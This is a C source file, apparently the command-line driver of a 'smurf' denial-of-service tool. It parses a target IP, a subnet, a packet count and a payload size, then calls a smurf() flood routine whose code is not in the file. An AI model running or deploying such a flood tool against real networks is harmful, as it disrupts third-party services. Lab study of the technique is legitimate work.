#include "smurf.h"
#include <shared/network.h>
#include <shared/random.h>

#include <stdio.h>
#include <stdlib.h>
#include <netinet/in.h>

#define DEFAULT_SUBNET 24
#define DEFAULT_COUNT 0
#define DEFAULT_PAYLOAD_SIZE 16

void print_usage(int argc, char* argv[]) {
    const char* app = argc ? argv[0] : "smurf";
    printf(
        "Usage: %s <ip> [subnet = %d] [count = %d] [payload size (bytes) = %d]\n",
        app, DEFAULT_SUBNET, DEFAULT_COUNT, DEFAULT_PAYLOAD_SIZE
    );

    #define PRINT_USAGE_EXAMPLE(example) \
        printf("    %s " example "\n", app);

    printf("Examples:\n");

    PRINT_USAGE_EXAMPLE("192.168.1.10");
    PRINT_USAGE_EXAMPLE("192.168.1.10 28");
    PRINT_USAGE_EXAMPLE("192.168.1.10 28 3");
    PRINT_USAGE_EXAMPLE("192.168.1.10 28 3 120");
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        print_usage(argc, argv);
        return EXIT_FAILURE;
    }

    struct sockaddr_in dest;
    int result = get_addr(&dest, argv[1]);
    if (result) {
        fprintf(stderr, "Can't parse address\n");
        return EXIT_FAILURE;
    }

    int subnet = DEFAULT_SUBNET;
    {
        if (argc >= 3) {
            subnet = atoi(argv[2]);
        }

        if (subnet < 0 || subnet > 32) {
            fprintf(stderr, "Wrong subnet value\n");
            return EXIT_FAILURE;
        }
    }

    int count = DEFAULT_COUNT;
    {
        if (argc >= 4) {
            count = atoi(argv[3]);
        }

        if (count < 0) {
            fprintf(stderr, "Wrong count value\n");
            return EXIT_FAILURE;
        }
    }

    int payload_size = DEFAULT_PAYLOAD_SIZE;
    {
        if (argc >= 5) {
            payload_size = atoi(argv[4]);
        }

        if (payload_size <= 0) {
            fprintf(stderr, "Wrong payload size value\n");
            return EXIT_FAILURE;
        }
    }

    random_init();

    smurf(dest, subnet, count, payload_size);

    return EXIT_SUCCESS;
}
